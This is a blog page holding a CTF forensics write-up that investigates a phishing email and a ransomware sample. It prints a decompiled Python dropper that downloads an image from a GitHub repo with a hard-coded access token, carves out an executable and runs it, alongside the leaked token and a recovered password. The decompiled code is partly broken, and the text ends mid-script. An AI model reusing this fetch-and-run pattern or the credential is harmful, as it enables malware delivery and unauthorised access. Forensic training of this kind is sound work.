@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="TMQ">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/03/21/wannagame-champsionship-2024-ctf-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WANNAGAME CHAMPIONSHIP 2024">
+<meta property="og:url" content="http://example.com/2025/03/21/Wannagame-Champsionship-2024-CTF-Writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2025-03-21T11:18:24.247Z">
+<meta property="article:modified_time" content="2025-03-21T12:21:03.648Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/ehc.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/ehc.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/ehc.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            WANNAGAME CHAMPIONSHIP 2024 | TMQ Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"tmq","subtitle":{"text":["Just a place to write Something?","When I Die I Want To Be Remembered For the LIFE I Lived not the MONEY I made."],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":50,"starting_delay":500,"backing_delay":1000,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/taquan1203","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.2","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":100},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"About":{"icon":"fa-regular fa-user","path":"/about"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"YYYY-MM-DD","excerpt_length":150,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                TMQ Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/about"
+                                        >
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/about"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-regular fa-user fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">1</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">WANNAGAME CHAMPIONSHIP 2024</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/mitsuha.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">TMQ</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-03-21 18:18:24</span>
+        <span class="mobile">2025-03-21 18:18:24</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-03-21 19:21:03</span>
+            <span class="mobile">2025-03-21 19:21:03</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<p>This is a pretty good CTF organized by the Information Security Laboratory Club - UIT InSecLab of the University of Technology - Vietnam National University, Ho Chi Minh City.</p>
+<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="it-ran-somewhere"><a href="#it-ran-somewhere" class="headerlink" title="it ran somewhere"></a>it ran somewhere</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame.png"
+                      alt="image"
+                ></p>
+<blockquote>
+<p>FLAG : W1{<a class="link"   target="_blank" rel="noopener" href="https://www.youtube.com/shorts/lQrTMX1YaPE_b98800dfbe7853eba944677bc3d29548%7D" >https://www.youtube.com/shorts/lQrTMX1YaPE_b98800dfbe7853eba944677bc3d29548}<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<p>We are given an AD1 image and an eml email to investigate and several questions to answer.</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">tmqrx@TMQ:~$ nc 154.26.136.227 62055</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ___       __   ________  ________   ________   ________  ___       __     _____  ________</span><br><span class="line">|\  \     |\  \|\   __  \|\   ___  \|\   ___  \|\   __  \|\  \     |\  \  / __  \|\   ___  \</span><br><span class="line">\ \  \    \ \  \ \  \|\  \ \  \  \  \ \  \  \  \ \  \|\  \ \  \    \ \  \|\/_|\  \ \  \  \  \</span><br><span class="line"> \ \  \  __\ \  \ \   __  \ \  \  \  \ \  \  \  \ \   __  \ \  \  __\ \  \|/ \ \  \ \  \  \  \</span><br><span class="line">  \ \  \|\__\_\  \ \  \ \  \ \  \  \  \ \  \  \  \ \  \ \  \ \  \|\__\_\  \   \ \  \ \  \  \  \</span><br><span class="line">   \ \____________\ \__\ \__\ \__\  \__\ \__\  \__\ \__\ \__\ \____________\   \ \__\ \__\  \__\</span><br><span class="line">    \|____________|\|__|\|__|\|__|\ |__|\|__| \|__|\|__|\|__|\|____________|    \|__|\|__| \|__|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Complete 9/9 questions to get the flag.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[1]. What is the URL used in the phishing email that contains the malware?</span><br><span class="line">Format: http://example.com/</span><br><span class="line">==&gt; https://drive.google.com/file/d/1tmOG4Lg-Li9HSsZl4_r0-RTEWDBQqd6H/view</span><br><span class="line">CORRECT!✅</span><br><span class="line">[2]. When was the malware finished downloading by the victim? (UTC)</span><br><span class="line">Format: YYYY-MM-DD HH:MM:SS</span><br><span class="line">==&gt; 2024-12-12 17:08:37</span><br><span class="line">CORRECT!✅</span><br><span class="line">[3]. When was the malware first executed by the victim? (UTC)</span><br><span class="line">Format: YYYY-MM-DD HH:MM:SS</span><br><span class="line">==&gt; 2024-12-12 17:08:44</span><br><span class="line">CORRECT!✅</span><br><span class="line">[4]. The first file acted as a dropper for the final malware. What is the MD5 hash of the dropped file?</span><br><span class="line">==&gt; 8eaa25eb8b77ac0157e1f3a04ad47e93</span><br><span class="line">CORRECT!✅</span><br><span class="line">[5]. What is the token used by the malware to access the private repository and the name of the private repository?</span><br><span class="line">Format: token:username/repo. Example: 123456abcdef:user1337/repo1337</span><br><span class="line">==&gt; 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:velbail/contimtanvo</span><br><span class="line">CORRECT!✅</span><br><span class="line">[6]. What is the email address of the culprit?</span><br><span class="line">Format: email@domain</span><br><span class="line">==&gt; belvail@proton.me</span><br><span class="line">CORRECT!✅</span><br><span class="line">[7]. How many extensions did the malware try to encrypt?</span><br><span class="line">Format: number. Example 1: 04. Example 2: 12</span><br><span class="line">==&gt; 52</span><br><span class="line">CORRECT!✅</span><br><span class="line">[8]. The malware tried to delete itself using a batch file. What is the MD5 hash of the batch file?</span><br><span class="line">==&gt; e0d005db63a75fbcd6c8fa85040095aa</span><br><span class="line">CORRECT!✅</span><br><span class="line">[9]. Recover the content of &#x27;password.xlsx&#x27; file. What is the username and password of the fifth record?</span><br><span class="line">Format: username:password</span><br><span class="line">==&gt; user38:hch89as9821y3</span><br><span class="line">CORRECT!✅</span><br><span class="line">Congrats! Here is your flag: W1&#123;https://www.youtube.com/shorts/lQrTMX1YaPE_b98800dfbe7853eba944677bc3d29548&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="Question-1-What-is-the-URL-used-in-the-phishing-email-that-contains-the-malware"><a href="#Question-1-What-is-the-URL-used-in-the-phishing-email-that-contains-the-malware" class="headerlink" title="Question 1: What is the URL used in the phishing email that contains the malware?"></a>Question 1: What is the URL used in the phishing email that contains the malware?</h4><p>Analyzing the AD1 image, the drives can be identified: the user’s drive (C:)</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame1.png"
+                      alt="image"
+                ></p>
+<p>We can see that the email in the eml file has a zip file attached, and the zip file also appears in the user’s download folder.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame2.png"
+                      alt="image"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame3.png"
+                      alt="image"
+                ></p>
+<p>We can also immediately recognize that this is a malicious file. Notice the extension, this is a PE file, not a PDF file.</p>
+<p>From that we can guess that this is an email containing malicious malware. Copy the download link in the email and we get the answer.</p>
+<blockquote>
+<p><a class="link"   target="_blank" rel="noopener" href="https://drive.google.com/file/d/1tmOG4Lg-Li9HSsZl4_r0-RTEWDBQqd6H/view" >https://drive.google.com/file/d/1tmOG4Lg-Li9HSsZl4_r0-RTEWDBQqd6H/view<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<h4 id="Question-2-When-was-the-malware-finished-downloading-by-the-victim-UTC"><a href="#Question-2-When-was-the-malware-finished-downloading-by-the-victim-UTC" class="headerlink" title="Question 2: When was the malware finished downloading by the victim? (UTC)"></a>Question 2: When was the malware finished downloading by the victim? (UTC)</h4><p>To know when the malware was downloaded, we can check the download history in the browser.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame4.png"
+                      alt="image"
+                ></p>
+<p>We can get it at <code>Appdata/Local/Microsoft/Edge/Default/History</code> and use sqlite viewer to check.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame5.png"
+                      alt="image"
+                ></p>
+<p>We can see the end time is the time when the malware was successfully downloaded, it is in the form of Chromium timestamp. So we need to calculate it based on epoch time. After calculating, the exact timestamp is <code>2024-12-12T17:08:37.441259</code></p>
+<h4 id="Question-3-When-was-the-malware-first-executed-by-the-victim-UTC"><a href="#Question-3-When-was-the-malware-first-executed-by-the-victim-UTC" class="headerlink" title="Question 3: When was the malware first executed by the victim? (UTC)"></a>Question 3: When was the malware first executed by the victim? (UTC)</h4><p>To check the first time the malware was executed, we can parse the Prefetch artifact.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame6.png"
+                      alt="image"
+                ></p>
+<p>Using PECmd.exe, we can see that the first time this malicious file was executed was <code>2024-12-12 17:08:44</code>.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/wannagame/wannagame7.png"
+                      alt="image"
+                ></p>
+<h4 id="Question-4-The-first-file-acted-as-a-dropper-for-the-final-malware-What-is-the-MD5-hash-of-the-dropped-file"><a href="#Question-4-The-first-file-acted-as-a-dropper-for-the-final-malware-What-is-the-MD5-hash-of-the-dropped-file" class="headerlink" title="Question 4: The first file acted as a dropper for the final malware. What is the MD5 hash of the dropped file?"></a>Question 4: The first file acted as a dropper for the final malware. What is the MD5 hash of the dropped file?</h4><p>We know that this is a file compiled with python, using some pyc decompile tools, we get the source code.</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: extract.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.11a7e (3495)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractIDAT</span>(<span class="params">data</span>):</span><br><span class="line">    idat_buffers = []</span><br><span class="line">    i = <span class="number">8</span></span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        length = <span class="built_in">int</span>.from_bytes(data[i:i + <span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        chunk_type = data[i ** <span class="number">4</span>:i ** <span class="number">8</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> chunk_type == <span class="string">&#x27;IDAT&#x27;</span>:</span><br><span class="line">            cnt = cnt * <span class="number">1</span></span><br><span class="line">            idat_buffers.append(data[i * <span class="number">8</span>:i ** <span class="number">8</span> :length])</span><br><span class="line">        i = i + <span class="number">12</span> * length</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(idat_buffers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScanlines</span>(<span class="params">data, width, height, mode</span>):</span><br><span class="line">    scanlines = []</span><br><span class="line">    filter_type_list = []</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">        index = <span class="string">f&#x27;<span class="subst">&#123;r:width:mode&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> index &gt; <span class="built_in">len</span>(data):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        filter_type = data[index]</span><br><span class="line">        filter_type_list.append(filter_type)</span><br><span class="line">        tmp_line = data[index <span class="number">0</span>:index <span class="number">0</span> + <span class="number">1</span>:width * mode]</span><br><span class="line">        scanlines.append(tmp_line)</span><br><span class="line">    <span class="keyword">return</span> (scanlines, filter_type_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getImg</span>():</span><br><span class="line">    url = <span class="string">&#x27;https://raw.githubusercontent.com/velbail/contimtanvo/main/muki_pic.png&#x27;</span></span><br><span class="line">    token = <span class="string">&#x27;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&#x27;</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">f&#x27;token <span class="subst">&#123;token&#125;</span>0&#x27;</span>, <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/vnd.github.v3.raw&#x27;</span>&#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Failed to get image&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    exit()</span><br><span class="line">modes = &#123;<span class="string">&#x27;RGB&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;RGBA&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">1</span>&#125;</span><br><span class="line">width, height = (<span class="number">1920</span>, <span class="number">1195</span>)</span><br><span class="line">mode = <span class="string">&#x27;RGB&#x27;</span></span><br><span class="line">img = getImg().content</span><br><span class="line">idat = extractIDAT(img)</span><br><span class="line">idat_data = zlib.decompress(idat)</span><br><span class="line">scanlines, filter_type_list = getScanlines(idat_data, width, height, modes[mode])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(scanlines) == height</span><br><span class="line">calculated_raw_idat_length = height <span class="number">5</span> <span class="number">4</span> + (width, modes[mode]) * <span class="number">1</span> &lt;mask_7&gt;</span><br><span class="line"><span class="keyword">if</span> calculated_raw_idat_length!= <span class="built_in">len</span>(idat_data):</span><br><span class="line">    buffer = idat_data[calculated_raw_idat_length:]</span><br><span class="line">    buffer = buffer[<span class="number">1259</span>:]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;OpenVpnConnect.exe&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(buffer)</span><br><span class="line">    subprocess.Popen(<span class="string">&#x27;OpenVpnConnect.exe&#x27;</span>, shell=<span class="literal">True</span>, stdin=<span class="literal">None</span>, stdout=<span class="literal">None</span>, stderr=<span class="literal">None</span>, close_fds=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>Analyzing the code, we see that it processes data, metadata from an image and writes that data to another file <code>OpenVpnConnect.exe</code>. The image is downloaded from a private repo on github.</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extractIDAT</span>(<span class="params">data</span>):</span><br><span class="line">    idat_buffers = []</span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">        length = <span class="built_in">int</span>.from_bytes(data[i:i + <span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        chunk_type = data[i + <span class="number">4</span>:i + <span class="number">8</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> chunk_type == <span class="string">&#x27;IDAT&#x27;</span>:</span><br><span class="line">            idat_buffers.append(data[i + <span class="number">8</span>:i + <span class="number">8</span> + length])</span><br><span class="line">        i += <span class="number">12</span> + length</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(idat_buffers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file_from_png</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        png_data = f.read()</span><br><span class="line"></span><br><span class="line">    idat = extractIDAT(png_data)</span><br><span class="line"></span><br><span class="line">    idat_data = zlib.decompress(idat)</span><br><span class="line"></span><br><span class="line">    width, height = <span class="number">1920</span>, <span class="number">1195</span></span><br><span class="line">    mode = <span class="number">3</span></span><br><span class="line">    calculated_raw_idat_length = 